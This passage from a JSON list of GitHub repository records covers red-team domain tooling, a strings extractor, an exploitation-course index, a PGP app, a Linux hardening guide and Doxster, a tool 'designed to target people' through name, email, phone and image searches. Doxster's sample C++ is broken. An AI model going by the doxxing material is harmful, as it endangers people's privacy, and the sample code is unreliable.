and a separate grade for the domain's DNS. You will almost certainly see a `Healthy` domain with questionable DNS. This is not something to be worried about without some human investigation. The DNS is based on VirusTotal's passive DNS report and checking to see if the IP addresses have appeared in any threat reports. If you bought an expired domain it's not at all strange to learn it once pointed at a cloud IP address that was flagged for something naughty at some point.\\n\\nCheck to see if the IP addresses in question are yours. If they are not then you can probably ignore this. If the IP address was flagged very recently, like just before you bought the domain, then that may be a concern because the domain may be flagged for recent malicious activity. There's a lot of \\\"maybes\\\" here because this is very much an imperfect grade.\\n\\nIn general, focus on the overall health status (based on categories) and just use the passive DNS information and flags to help with manual analysis of your domains.\\n\"", "topics": ["redteam", "infrastructure", "dns"], "writeup": "", "ignoredescription": false, "id": 29, "full_name": "GhostManager/Shepherd", "url": "https://github.com/GhostManager/Shepherd", "topic_string": "redteam infrastructure dns"},
{"tags": [], "owner": "glmcdona", "description": "strings2: An improved strings extraction tool.", "name": "strings2", "topics_string": "", "language": "C++", "readme": "\"# strings2\\nStrings2 is a Windows 32bit and 64bit command-line tool for extracting strings from binary data. On top of the classical Sysinternals strings approach, this improved version is also able to dump strings from process address spaces and also reconstructs hidden assembly local variable assignment ASCII/unicode strings. Currently, the ASM-string extracting approach only supports the x86 instruction set.\\n\\nI am maintaining a public binary release download page for this project at:\\n http://split-code.com/strings2.html\\n\\n\\n## Flags\\nThe command-line flags for strings2 are as follows:\\n\\n\\t -f\\n\\tPrints the filename/processname before each string.\\n\\t\\n\\t -r\\n\\tRecursively process subdirectories.\\n\\t\\n\\t -t\\n\\tPrints the type before each string. Unicode,\\n\\tASCII, or assembly unicode/ASCII stack push.\\n\\t\\n\\t -asm\\n\\tOnly prints the extracted ASCII/unicode\\n\\tassembly stack push-hidden strings.\\n\\t\\n\\t -raw\\n\\tOnly prints the regular ASCII/unicode strings.\\n\\t\\n\\t -l [numchars]\\n\\tMinimum number of characters that is\\n\\ta valid string. Default is 4.\\n\\t\\n\\t -nh\\n\\tNo header is printed in the output.\\n\\t\\n\\t -pid\\n\\tThe strings from the process address space for the\\n\\tspecified PID will be dumped. Use a '0x' prefix to\\n\\tspecify a hex PID.\\n\\t \\n\\t -system\\n\\tDumps strings from all accessible processes on the\\n\\tsystem. This takes awhile.\\n\\n\\t\\t\\n## Example Usage\\nFrom the command prompt:\\n* strings2 malware.exe\\n* strings2 *.exe > strings.txt\\n* strings2 *.exe -nh -f -t -asm > strings.txt\\n* strings2 -pid 419 > process_strings.txt\\n* strings2 -pid 0x1a3 > process_strings.txt\\n* strings2 -system > all_process_strings.txt\\n* cat abcd.exe | strings2 > out.txt\\n\\n\\n## Contributing\\nContributions are welcome. Some possible contribution directions are as follows:\\n* Only print unique strings.\\n* Add flag support for dumping process strings by process/window title matching.\\n* Add x64 assembly support for extracting ASM stack pushed strings.\\n\"", "topics": ["windows", "reverse-engineering"], "writeup": "Strings2 is a Windows 32bit and 64bit command-line tool for extracting strings from binary data. On top of the classical Sysinternals strings approach, this improved version is also able to dump strings from process address spaces and also reconstructs hidden assembly local variable assignment ASCII/unicode strings. Currently, the ASM-string extracting approach only supports the x86 instruction set.", "ignoredescription": false, "id": 30, "full_name": "glmcdona/strings2", "url": "https://github.com/glmcdona/strings2", "topic_string": "windows reverse-engineering"},
{"tags": [], "owner": "google", "description": "A License Classifier", "name": "licenseclassifier", "topics_string": "", "language": "Go", "readme": "\"# License Classifier\\n\\n[![Build status](https://travis-ci.org/google/licenseclassifier.svg?branch=master)](https://travis-ci.org/google/licenseclassifier)\\n\\n## Introduction\\n\\nThe license classifier is a library and set of tools that can analyze text to\\ndetermine what type of license it contains. It searches for license texts in a\\nfile and compares them to an archive of known licenses. These files could be,\\ne.g., `LICENSE` files with a single or multiple licenses in it, or source code\\nfiles with the license text in a comment.\\n\\nA \\\"confidence level\\\" is associated with each result indicating how close the\\nmatch was. A confidence level of `1.0` indicates an exact match, while a\\nconfidence level of `0.0` indicates that no license was able to match the text.\\n\\n## Adding a new license\\n\\nAdding a new license is straight-forward:\\n\\n1. Create a file in `licenses/`.\\n\\n * The filename should be the name of the license or its abbreviation. If\\n the license is an Open Source license, use the appropriate identifier\\n specified at https://spdx.org/licenses/.\\n * If the license is the \\\"header\\\" version of the license, append the suffix\\n \\\"`.header`\\\" to it. See `licenses/README.md` for more details.\\n\\n2. Add the license name to the list in `license_type.go`.\\n\\n3. Regenerate the `licenses.db` file by running the license serializer:\\n\\n ```shell\\n $ license_serializer -output licenseclassifier/licenses\\n ```\\n\\n4. Create and run appropriate tests to verify that the license is indeed\\n present.\\n\\n## Tools\\n\\n### Identify license\\n\\n`identify_license` is a command line tool that can identify the license(s)\\nwithin a file.\\n\\n```shell\\n$ identify_license LICENSE\\nLICENSE: GPL-2.0 (confidence: 1, offset: 0, extent: 14794)\\nLICENSE: LGPL-2.1 (confidence: 1, offset: 18366, extent: 23829)\\nLICENSE: MIT (confidence: 1, offset: 17255, extent: 1059)\\n```\\n\\n### License serializer\\n\\nThe `license_serializer` tool regenerates the `licenses.db` archive. The archive\\ncontains preprocessed license texts for quicker comparisons against unknown\\ntexts.\\n\\n```shell\\n$ license_serializer -output licenseclassifier/licenses\\n```\\n\\n----\\nThis is not an official Google product (experimental or otherwise), it is just\\ncode that happens to be owned by Google.\\n\"", "topics": ["license-management", "classifier"], "writeup": "", "ignoredescription": false, "id": 31, "full_name": "google/licenseclassifier", "url": "https://github.com/google/licenseclassifier", "topic_string": "license-management classifier"},
{"tags": [], "owner": "guyinatuxedo", "description": "", "name": "nightmare", "topics_string": "", "language": "Python", "readme": "\"# Nightmare\\n\\nNightmare is an intro to binary exploitation / reverse engineering course based around ctf challenges. I call it that because it's a lot of people's nightmare to get hit by weaponized 0 days, which these skills directly translate into doing that type of work (plus it's a really cool song).\\n\\n## What makes Nightmare different?\\n\\nIt's true there are a lot of resources out there to learn binary exploitation / reverse engineering skills, so what makes this different?\\n\\n```\\n* Amount of Content - There is a large amount of content in this course (currently over 90 challenges), laid out in a linear fashion.\\n\\n* Well Documented Write Ups - Each challenge comes with a well documented writeup explaining how to go from being handed the binary to doing the exploit dev.\\n\\n* Multiple Problems per Topic - Most modules have multiple different challenges. This way you can use one to learn how the attack works, and then apply it to the others. Also different iterations of the problem will have knowledge needed to solve it.\\n\\n* Using all open source tools - All the tools used here are free and open sourced. No IDA torrent needed.\\n\\n* A Place to Ask Questions - So if you have a problem that you've been working for days and can't get anywhere (and google isn't helping).\\n```\\n\\nI have found that resources that have many of these things to be few and far between. As a result it can make learning these skills difficult since you don't really know what to learn, or how to learn it. This is essentially my attempt to help fix some of those problems.\\n## Static Site\\n\\nIf you want, there is a static github pages site which people say looks better: https://guyinatuxedo.github.io/\\n\\n## Github\\n\\nA copy of all of the challenges listed, can be found on the github: https://github.com/guyinatuxedo/nightmare\\n\\n## Special Thanks\\n\\nSpecial thanks to these people:\\n\\n```\\nnoopnoop - For dealing with me\\ndigitalcold - For showing me how good nightmare could look with mdbook\\nyou nerds - For looking at this\\n```\\n\\n## Discord\\n\\nIf you get stuck on something for hours on end and google can't answer your question, try asking in the discord (or if you just feel like talking about cool security things). Here is a link to it `https://discord.gg/p5E3VZF`\\n\\nAlso if you notice any typos or mistakes, feel free to mention it in the Discord. With how much content is here, there is bound to be at least one.\\n\\n# Index\\n\\nHere is the index for all of the content in this course. Feel free to go through the whole thing, or only parts of it (don't let me tell you how to live your life). For the order that you do the challenges in a module, I would recommend starting with the first.\\n\\n\\n## Intro Departure\\n\\n#### 0.) Intro to the Project \\n\\n#### 1.) Intro to Assembly \\n- Intro to assembly\\n- Sample assembly reverse challs\\n\\n#### 2.) Intro to Tooling \\n- gdb-gef \\n- pwntools\\n- ghidra\\n\\n#### 3.) Beginner RE \\n- pico18_strings \\n- helithumper_re\\n- csaw18_tourofx86pt1 \\n- csaw19_beleaf\\n\\n## Stack pt 0 Stack Tendencies\\n\\n#### 4.) Buffer Overflow of Variables\\n\\n- Csaw18/boi\\n- TokyoWesterns17/just_do_it\\n- Tamu19_pwn1\\n\\n#### 5.) Buffer Overflow Call Function\\n- Csaw18_getit \\n- Tu17_vulnchat\\n- Csaw16_warmup\\n\\n#### 5.1) aslr/pie intro \\n- quick aslr/pie explanation\\n\\n#### 6.) Buffer Overflow Call Shellcode\\n- Tamu19_pwn3 \\n- Csaw17_pilot\\n- Tu18_shelleasy \\n\\n#### 6.1) nx intro \\n- nx explanation\\n\\n#### 7.) ROP Chain Statically compiled\\n- dcquals19_speedrun1\\n- bkp16_simplecalc\\n- dcquals16_feedme\\n\\n#### 7.1) stack canary intro \\n- stack canary introduction\\n\\n#### 7.2) relro intro \\n- relro introduction\\n\\n#### 8.) ROP Dynamically Compiled\\n- csaw17_svc \\n- fb19_overfloat \\n- hs19_storytime \\n- csaw19_babyboi\\n- utc19_shellme\\n\\n## General pt 0 Stardust Challenges\\n\\n#### 9.) Bad Seed \\n- h3_time \\n- hsctf19_tuxtalkshow \\n- sunshinectf17_prepared \\n\\n\\n#### 10.) Format strings \\n- backdoor17_bbpwn \\n- twesterns16_greeting\\n- pico_echo\\n- watevr19_betstar\\n\\n#### 11.) Index Array \\n- dcquals16_xkcd\\n- sawmpctf19_dreamheaps\\n- sunshinectf2017_alternativesolution\\n\\n#### 12.) Z3 \\n- tokyowesterns17_revrevrev \\n- tuctf_future \\n- hsctf19_abyte \\n\\n#### 13.) Angr \\n- securityfest_fairlight \\n- plaid19_icancount\\n- defcamp15_r100\\n\\n## Stack pt 1 Return to Stack, truly a perfect game\\n\\n#### 14.) Ret2system \\n- asis17_marymorton \\n- hxp18_poorcanary \\n- tu_guestbook\\n\\n#### 15.) Partial Overwrite \\n- Tu17_vulnchat2 \\n- Tamu19_pwn2\\n- hacklu15_stackstuff\\n\\n#### 16.) SROP \\n- backdoorctf_funsignals \\n- inctf17_stupiddrop\\n- swamp19_syscaller\\n- csaw19_smallboi\\n\\n#### 17.) Stack Pivot / Partial Overwrite\\n- defconquals19_speedrun4\\n- insomnihack18_onewrite\\n- xctf16_b0verfl0w\\n\\n#### 18.) Ret2Csu / Ret2dl \\n- ropemporium_ret2csu\\n- 0ctf 2018 babystack\\n\\n## General pt 1 Armstrong challenges\\n\\n#### 19.) Shellcoding pt 1 \\n- defconquals19_s3 \\n- Csaw18_shellpointcode\\n- defconquals19_s6\\n\\n#### 20.) Patching/Jumping \\n- dcquals18_elfcrumble \\n- plaid19_plaid_part_planning_III \\n- csaw16_gametime \\n\\n\\n#### 21.) .NET Reversing \\n- csaw13_dotnet \\n- csaw13_bikinibonanza\\n- whitehat18_re06\\n\\n#### 22.) Movfuscation \\n- sawmpctf19_future \\n- asis18quals_babyc \\n- other_movfuscated\\n\\n#### 23.) Custom Architectures\\n- h3_challenge0 \\n- h3_challenge1\\n- h3_challenge2\\n- h3_challenge3\\n\\n## Heap Pt 0 rip Angel Beats\\n\\n#### 24.) Basic Heap overflow\\n- protostar_heap1\\n- protostar_heap0\\n- protostar_heap2\\n\\n#### 25.) Intro to heap exploitation / binning \\n- explanation\\n\\n#### 26.) Heap Grooming \\n- explanation \\n- swamp19_heapgolf\\n- pico_areyouroot \\n\\n#### 27.) Edit Freed Chunk (pure explanation) \\n- Use After Free \\n- Double Free \\n- Null Byte Heap Consolidation\\n\\n#### 28.) Fastbin Attack \\n- explanation \\n- 0ctf18_babyheap\\n- csaw17_auir \\n\\n#### 29.) tcache \\n- explanation\\n- dcquals19_babyheap\\n- plaid19_cpp \\n\\n#### 30.) unlink \\n- explanation\\n- hitcon14_stkof \\n- zctf16_note \\n\\n#### 31.) Unsorted Bin Attack \\n- explanation\\n- hitcon_magicheap \\n- 0ctf16_zer0storage \\n\\n#### 32.) Large Bin Attack \\n- largebin0_explanation\\n- largebin1_explanation\\n\\n#### 33.) Custom Malloc \\n- csawquals17_minesweeper \\n- csawquals18_AliensVSSamurai\\n- csawquals19_traveller\\n\\n## General Pt 2 Generic Isekai #367\\n\\n#### 34.) Qemu / Emulated Targets \\n- csaw18_tour_of_x86_pt_2 \\n- csaw15_hackingtime \\n- csaw17_realism\\n\\n#### 35.) Integer Exploitation \\n- puzzle\\n- int_overflow_post\\n- signed_unsigned_int_expl\\n\\n#### 36.) Obfuscated Reversing \\n- csaw15_wyvern \\n- csaw17_prophecy\\n- bkp16_unholy\\n\\n#### 37.) FS Exploitation \\n- swamp19_badfile\\n\\n#### 38.) Grab Bag \\n- csaw18_doubletrouble\\n- hackim19_shop \\n- unit_vars_expl\\n- csaw19_gibberish\\n\\n## Heap pt 1 heap x heap\\n\\n#### 39.) House of Spirit \\n- explanation\\n- hacklu14_oreo\\n\\n#### 40.) House of Lore \\n- explanation\\n\\n#### 41.) House of Force \\n- explanation\\n- bkp16_cookbook\\n\\n#### 42.) House of Einherjar \\n- explanation\\n\\n#### 43.) House of Orange \\n- explanation\\n\\n#### 44.) More tcache\\n- csaw19_poppingCaps0\\n- csaw19_poppingCaps1\\n\\n#### 45.) Automatic Exploit Generation\\n- csaw20_rop\\n\\n#### Ending Documentation\\n- References\\n- What's next\\n\\n\\n\"", "topics": ["training", "exploit", "course", "reverse-engineering"], "writeup": "", "ignoredescription": false, "id": 32, "full_name": "guyinatuxedo/nightmare", "url": "https://github.com/guyinatuxedo/nightmare", "topic_string": "training exploit course reverse-engineering"},
{"tags": [], "owner": "henryboldi", "description": "\ud83d\udd11\ud83d\udd25\ud83d\udcc8 Next Level PGP", "name": "felony", "topics_string": "", "language": "JavaScript", "readme": "\"![Felony Logo](https://i.imgur.com/gqG7XoQ.png)\\n![Felony Screenshot](https://i.imgur.com/0e1ZOLp.png)\\n\\n**Felony is an open-source pgp keychain built on the modern web with Electron, React, and Redux.** Felony is the first PGP app that's easy for anyone to use, without a tutorial.\\n\\n[![Github All Releases](https://img.shields.io/github/downloads/henryboldi/felony/total.svg?maxAge=2592000)]()\\n\\n[![FOSSA Status](https://app.fossa.io/api/projects/git%2Bhttps%3A%2F%2Fgithub.com%2Fhenryboldi%2Ffelony.svg?size=large)](https://app.fossa.io/projects/git%2Bhttps%3A%2F%2Fgithub.com%2Fhenryboldi%2Ffelony?ref=badge_large)\\n\\n## Download Felony\\nYou can download compiled versions of Felony for Windows, macOS, and Linux from https://github.com/henryboldi/felony/releases. The app is currently in its pre-release stage, so it hasn't been fully tested on all platforms. Confirmed to be working on Mac, as that's what the developers own.\\n\\n## How it works\\n### 1. Add public keys to your buddies list\\nA public key is like a username - Adding someone\\u2019s public key to your buddies list lets you send them messages. You can find other public keys on markets like Keybase.io and Darknet.\\n### 2. Encrypt a message\\nSelect a recipient from your buddies list and compose a message. Only your chosen recipient(s) can read the message. Encrypted messages can be used to send sensitive information, such as an address, document, or anything intended to be read only by intended recipients.\\n### 3. Send the encrypted message anywhere\\nYou can send the encrypted message on any website! Send encrypted messages over Facebook Messenger, Twitter DMs, YouTube, Instagram, or anywhere else. **Felony is security when and where you want it.**\\n\\n## Running Locally\\nTo run the development environment run\\n```\\nnpm run dev\\n```\\nTo package felony run\\n```\\nnpm run package\\n```\\nTo build for all platforms\\n```\\nnpm run package-all\\n```\\nFor more information check out [electron-react-boilerplate](https://github.com/chentsulin/electron-react-boilerplate), which we used as a starting point.\\n\\n## Feature Requests\\nHave an idea for a feature you'd love to see in Felony? Create an issue and tag it as a feature request.\\n\\n## Maintainers\\n\\nMaintained with \\u2764\\ufe0f by [Sanil](https://github.com/TechyPeople), [Frank](https://github.com/frankcash).\\n\\nCreated by [Henry](https://github.com/henryboldi) & [Case](https://github.com/casesandberg).\\n\\n> 100% inline styles via [ReactCSS](http://reactcss.com/)\\n\"", "topics": ["electron", "encryption", "react", "encrypted-messages", "pgp"], "writeup": "", "ignoredescription": false, "id": 33, "full_name": "henryboldi/felony", "url": "https://github.com/henryboldi/felony", "topic_string": "electron encryption react encrypted-messages pgp"},
{"tags": [], "owner": "Imgp3Dev", "description": "Doxster is a information gathering tool designed to target people.", "name": "Doxster", "topics_string": "", "language": "C++", "readme": "\"# Doxster\\nDoxster is a information gathering tool designed to target people.\\n\\n## Example code of Reverse Image searching\\n``` C++\\n#include <cpr/cpr.h>\\n#include <iostream>\\n#include <string>\\n#include <fstream>\\nint main(int agrc, char** argv){\\nstd::ifstream file(\\\"ImageReverseWebsite.txt\\\");\\nif(file == \\\"ImageReverseWebsite.txt\\\"){\\nstring image;\\nimage = cout << \\\"Enter the file name: \\\"; /*File name goes here*/\\ncin >> image;\\nimage = system(\\\"find /sdcard/screenshots\\\");\\nsystem(image);\\nauto r = cpr::Get(cpr::Url{file, image};\\n}\\n```\\n**^one of the examples**\\n\\n## Features\\n- fuzzy string match\\n\\n- name search\\n\\n- email search\\n\\n- reverse image search\\n\\n- number search\\n\\n## Supported services\\nTinEye, Intelius, tools4noobs.\\n\\n## Supported social medias\\nInstagram, Kik, Twitter, facebook\\n\\n\\n## required Lib\\n[cpr](https://github.com/whoshuu/cpr/)\\n\\n[libgen](https://github.com/SebastienDebia/libRegen/)\\n\\n## Configuration\\nin order to use Doxster to it's fullest extent make sure to go to [src/Doxster.cpp](https://github.com/Imgp3Dev/Doxster/blob/master/src/Doxster.cpp) and add a specific path to your images within the **system()** code.\\n\\n## Files to use\\n**socialwebsites.txt** - social media searching.\\n\\n**ReverseNumber.txt** - Phone number reverse searching.\\n\\n**ImageReverseWebsite.txt** - Image reverse searching.\\n\\n## Upcoming features\\n- Automatic dox formatting\\n\\n- IP scan\\n\\n**Note:** Doxster isn't finished and still has some issues.\\n\"", "topics": ["phone-number", "scrape", "osint", "dox"], "writeup": "", "ignoredescription": false, "id": 34, "full_name": "Imgp3Dev/Doxster", "url": "https://github.com/Imgp3Dev/Doxster", "topic_string": "phone-number scrape osint dox"},
{"tags": [], "owner": "imthenachoman", "description": "An evolving how-to guide for securing a Linux server.", "name": "How-To-Secure-A-Linux-Server", "topics_string": "", "language": "", "readme": "\"# How To Secure A Linux Server\\n\\nAn evolving how-to guide for securing a Linux server that, hopefully, also teaches you a little about security and why it matters.\\n\\n[![CC-BY-SA](https://i.creativecommons.org/l/by-sa/4.0/88x31.png)](#license)\\n\\n## Table of Contents\\n\\n- [Introduction](#introduction)\\n - [Guide Objective](#guide-objective)\\n - [Why Secure Your Server](#why-secure-your-server)\\n - [Why Yet Another Guide](#why-yet-another-guide)\\n - [Other Guides](#other-guides)\\n - [To Do / To Add](#to-do--to-add)\\n- [Guide Overview](#guide-overview)\\n - [About This Guide](#about-this-guide)\\n - [My Use-Case](#my-use-case)\\n - [Editing Configuration Files - For The Lazy](#editing-configuration-files---for-the-lazy)\\n - [Contributing](#contributing)\\n- [Before You Start](#before-you-start)\\n - [Identify Your Principles](#identify-your-principles)\\n - [Picking A Linux Distribution](#picking-a-linux-distribution)\\n - [Installing Linux](#installing-linux)\\n - [Pre/Post Installation Requirements](#prepost-installation-requirements)\\n - [Other Important Notes](#other-important-notes)\\n- [The SSH Server](#the-ssh-server)\\n - [SSH Public/Private Keys](#ssh-publicprivate-keys)\\n - [Create SSH Group For AllowGroups](#create-ssh-group-for-allowgroups)\\n - [Secure `/etc/ssh/sshd_config`](#secure-etcsshsshd_config)\\n - [Remove Short Diffie-Hellman Keys](#remove-short-diffie-hellman-keys)\\n - [2FA/MFA for SSH](#2famfa-for-ssh)\\n- [The Basics](#the-basics)\\n - [Limit Who Can Use sudo](#limit-who-can-use-sudo)\\n - [NTP Client](#ntp-client)\\n - [Securing /proc](#securing-proc)\\n - [Force Accounts To Use Secure Passwords](#force-accounts-to-use-secure-passwords)\\n - [Automatic Security Updates and Alerts](#automatic-security-updates-and-alerts)\\n - [More Secure Random Entropy Pool (WIP)](#more-secure-random-entropy-pool-wip)\\n- [The Network](#the-network)\\n - [Firewall With UFW (Uncomplicated Firewall)](#firewall-with-ufw-uncomplicated-firewall)\\n - [iptables Intrusion Detection And Prevention with PSAD](#iptables-intrusion-detection-and-prevention-with-psad)\\n - [Application Intrusion Detection And Prevention With Fail2Ban](#application-intrusion-detection-and-prevention-with-fail2ban)\\n- [The Auditing](#the-auditing)\\n - [File/Folder Integrity Monitoring With AIDE (WIP)](#filefolder-integrity-monitoring-with-aide-wip)\\n - [Anti-Virus Scanning With ClamAV (WIP)](#anti-virus-scanning-with-clamav-wip)\\n - [Rootkit Detection With Rkhunter (WIP)](#rootkit-detection-with-rkhunter-wip)\\n - [Rootkit Detection With chrootkit (WIP)](#rootkit-detection-with-chrootkit-wip)\\n - [logwatch - system log analyzer and reporter](#logwatch---system-log-analyzer-and-reporter)\\n - [ss - Seeing Ports Your Server Is Listening On](#ss---seeing-ports-your-server-is-listening-on)\\n - [Lynis - Linux Security Auditing](#lynis---linux-security-auditing)\\n- [The Danger Zone](#the-danger-zone)\\n- [The Miscellaneous](#the-miscellaneous)\\n - [Gmail and Exim4 As MTA With Implicit TLS](#gmail-and-exim4-as-mta-with-implicit-tls)\\n - [Separate iptables Log File](#separate-iptables-log-file)\\n- [Left Over](#left-over)\\n - [Contacting Me](#contacting-me)\\n - [Helpful Links](#helpful-links)\\n - [Acknowledgments](#acknowledgments)\\n - [License and Copyright](#license-and-copyright)\\n\\n(TOC made with [nGitHubTOC](https://imthenachoman.github.io/nGitHubTOC/))\\n\\n## Introduction\\n\\n### Guide Objective\\n\\nThis guides purpose is to teach you how to secure a Linux server.\\n\\nThere are a lot of things you can do to secure a Linux server and this guide will attempt to cover as many of them as possible. More topics/material will be added as I learn, or as folks [contribute](#contributing).\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Why Secure Your Server\\n\\nI assume you're using this guide because you, hopefully, already understand why good security is important. That is a heavy topic onto itself and breaking it down is out-of-scope for this guide. If you don't know the answer to that question, I advise you research it first.\\n\\nAt a high level, the second a device, like a server, is in the public domain -- i.e visible to the outside world -- it becomes a target for bad-actors. An unsecured device is a playground for bad-actors who want access to your data, or to use your server as another node for their large-scale DDOS attacks.\\n\\nWhat's worse is, without good security, you may never know if your server has been compromised. A bad-actor may have gained unauthorized access to your server and copied your data without changing anything so you'd never know. Or your server may have been part of a DDOS attack and you wouldn't know. Look at many of the large scale data breaches in the news -- the companies often did not discover the data leak or intrusion until long after the bad-actors were gone.\\n\\nContrary to popular belief, bad-actors don't always want to change something or [lock you out of your data for money](https://en.wikipedia.org/wiki/Ransomware). Sometimes they just want the data on your server for their data warehouses (there is big money in big data) or to covertly use your server for their nefarious purposes.\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Why Yet Another Guide\\n\\nThis guide may appear duplicative/unnecessary because there are countless articles online that tell you [how to secure Linux](https://duckduckgo.com/?q=how+to+secure+linux&t=ffab&atb=v151-7&ia=web), but the information is spread across different articles, that cover different things, and in different ways. Who has time to scour through hundreds of articles?\\n\\nAs I was going through research for my Debian build, I kept notes. At the end I realized that, along with what I already knew, and what I was learning, I had the makings of a how-to guide. I figured I'd put it online to hopefully help others **learn**, and **save time**.\\n\\nI've never found one guide that covers everything -- this guide is my attempt.\\n\\nMany of the things covered in this guide may be rather basic/trivial, but most of us do not install Linux every day and it is easy to forget those basic things.\\n\\nIT automation tools like [Ansible](https://www.ansible.com/), [Chef](https://www.chef.io/), [Jenkins](https://jenkins.io/), [Puppet](https://puppet.com/), etc. help with the tedious task of installing/configuring a server but IMHO they are better suited for multiple or large scale deployments. IMHO, the overhead required to use those kinds of automation tools is wholly unnecessary for a one-time single server install for home use.\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Other Guides\\n\\nThere are many guides provided by experts, industry leaders, and the distributions themselves. It is not practical, and sometimes against copyright, to include everything from those guides. I recommend you check them out before starting with this guide.\\n\\n- The [Center for Internet Security (CIS)](https://www.cisecurity.org/) provides [benchmarks](https://www.cisecurity.org/cis-benchmarks/) that are exhaustive, industry trusted, step-by-step instructions for securing many flavors of Linux. Check their [About Us](https://www.cisecurity.org/about-us/) page for details. My recommendation is to go through this guide first and then CIS's guide. That way their recommendations will trump anything in this guide.\\n- For distribution specific hardening/security guides, check your distributions documentation.\\n- https://security.utexas.edu/os-hardening-checklist/linux-7 - Red Hat Enterprise Linux 7 Hardening Checklist\\n- https://cloudpro.zone/index.php/2018/01/18/debian-9-3-server-setup-guide-part-1/ - # Debian 9.3 server setup guide\\n- https://blog.vigilcode.com/2011/04/ubuntu-server-initial-security-quick-secure-setup-part-i/ - Ubuntu Server Initial Security guide\\n- https://www.tldp.org/LDP/sag/html/index.html\\n- https://seifried.org/lasg/\\n- https://news.ycombinator.com/item?id=19178964\\n- https://wiki.archlinux.org/index.php/Security - many folks have also recommended this one\\n- https://securecompliance.co/linux-server-hardening-checklist/\\n\\n([Table of Contents](#table-of-contents))\\n\\n### To Do / To Add\\n\\n- [ ] [Custom Jails for Fail2ban](#custom-jails)\\n- [ ] MAC (Mandatory Access Control) and Linux Security Modules (LSMs)\\n - https://wiki.archlinux.org/index.php/security#Mandatory_access_control\\n - Security-Enhanced Linux / SELinux\\n - https://en.wikipedia.org/wiki/Security-Enhanced_Linux\\n - https://linuxtechlab.com/beginners-guide-to-selinux/\\n - https://linuxtechlab.com/replicate-selinux-policies-among-linux-machines/\\n - https://teamignition.us/how-to-stop-being-a-scrub-and-learn-to-use-selinux.html\\n - AppArmor\\n - https://wiki.archlinux.org/index.php/AppArmor\\n - https://security.stackexchange.com/questions/29378/comparison-between-apparmor-and-selinux\\n - http://www.insanitybit.com/2012/06/01/why-i-like-apparmor-more-than-selinux-5/\\n- [ ] disk encryption\\n- [ ] Rkhunter and chrootkit\\n - http://www.chkrootkit.org/\\n - http://rkhunter.sourceforge.net/\\n - https://www.cyberciti.biz/faq/howto-check-linux-rootkist-with-detectors-software/\\n - https://www.tecmint.com/install-rootkit-hunter-scan-for-rootkits-backdoors-in-linux/\\n- [ ] shipping/backing up logs - https://news.ycombinator.com/item?id=19178681\\n- [ ] CIS-CAT - https://learn.cisecurity.org/cis-cat-landing-page\\n- [ ] debsums - https://blog.sleeplessbeastie.eu/2015/03/02/how-to-verify-installed-packages/\\n\\n([Table of Contents](#table-of-contents))\\n\\n## Guide Overview\\n\\n### About This Guide\\n\\nThis guide...\\n\\n- ...**is** a work in progress.\\n- ...**is** focused on **at-home** Linux servers. All of the concepts/recommendations here apply to larger/professional environments but those use-cases call for more advanced and specialized configurations that are out-of-scope for this guide.\\n- ...**does not** teach you about Linux, how to [install Linux](#installing-linux), or how to use it. Check https://linuxjourney.com/ if you're new to Linux.\\n- ...**is** meant to be [Linux distribution agnostic](#picking-a-linux-distribution).\\n- ...**does not** teach you everything you need to know about security nor does it get into all aspects of system/server security. For example, physical security is out of scope for this guide.\\n- ...**does not** talk about how programs/tools work, nor does it delve into their nook and crannies. Most of the programs/tools this guide references are very powerful and highly configurable. The goal is to cover the bare necessities -- enough to whet your appetite and make you hungry enough to want to go and learn more.\\n- ...**aims** to make it easy by providing code you can copy-and-paste. You might need to modify the commands before you paste so keep your favorite [text editor](https://notepad-plus-plus.org/) handy.\\n- ...**is** organized in an order that makes logical sense to me -- i.e. securing SSH before installing a firewall. As such, this guide is intended to be followed in the order it is presented but it is not necessary to do so. Just be careful if you do things in a different order -- some sections require previous sections to be completed.\\n\\n([Table of Contents](#table-of-contents))\\n\\n### My Use-Case\\n\\nThere are many types of servers and different use-cases. While I want this guide to be as generic as possible, there will be some things that may not apply to all/other use-cases. Use your best judgement when going through this guide.\\n\\nTo help put context to many of the topics covered in this guide, my use-case/configuration is:\\n\\n- A desktop class computer...\\n- With a single NIC...\\n- Connected to a consumer grade router...\\n- Getting a dynamic WAN IP provided by the ISP...\\n- With WAN+LAN on IPV4...\\n- And LAN using [NAT](https://en.wikipedia.org/wiki/Network_address_translation)...\\n- That I want to be able to SSH to remotely from unknown computers and unknown locations (i.e. a friend's house).\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Editing Configuration Files - For The Lazy\\n\\nI am very lazy and do not like to edit files by hand if I don't need to. I also assume everyone else is just like me. :)\\n\\nSo, when and where possible, I have provided `code` snippets to quickly do what is needed, like add or change a line in a configuration file.\\n\\nThe `code` snippets use basic commands like `echo`, `cat`, `sed`, `awk`, and `grep`. How the `code` snippets work, like what each command/part does, is out of scope for this guide -- the `man` pages are your friend.\\n\\n**Note**: The `code` snippets do not validate/verify the change went through -- i.e. the line was actually added or changed. I'll leave the verifying part in your capable hands. The steps in this guide do include taking backups of all files that will be changed.\\n\\nNot all changes can be automated with `code` snippets. Those changes need good, old fashioned, manual editing. For example, you can't just append a line to an [INI](https://en.wikipedia.org/wiki/INI_file) type file. Use your [favorite](https://en.wikipedia.org/wiki/Vi) Linux text editor.\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Contributing\\n\\nI wanted to put this guide on [GitHub](http://www.github.com) to make it easy to collaborate. The more folks that contribute, the better and more complete this guide will become.\\n\\nTo contribute you can fork and submit a pull request or submit a [new issue](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/issues/new).\\n\\n([Table of Contents](#table-of-contents))\\n\\n## Before You Start\\n\\n### Identify Your Principles\\n\\nBefore you start you will want to identify what your Principles are. What is your [threat model](https://en.wikipedia.org/wiki/Threat_model)? Some things to think about:\\n\\n- Why do you want to secure your server?\\n- How much security do you want or not want?\\n- How much convenience are you willing to compromise for security and vice-versa?\\n- What are the threats you want to protect against? What are the specifics to your situation? For example:\\n - Is physical access to your server/network a possible attack vector?\\n - Will you be opening ports on your router so you can access your server from outside your home?\\n - Will you be hosting a file share on your server that will be mounted on a desktop class machine? What is the possibility of the desktop machine getting infected and, in turn, infecting the server?\\n - Do you have a means of recovering if your security implementation locks you out of your own server? For example, you [disabled root login](#disable-root-login) or [password protected GRUB](#password-protect-grub).\\n\\nThese are just **a few things** to think about. Before you start securing your server you will want to understand what you're trying to protect against and why so you know what you need to do.\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Picking A Linux 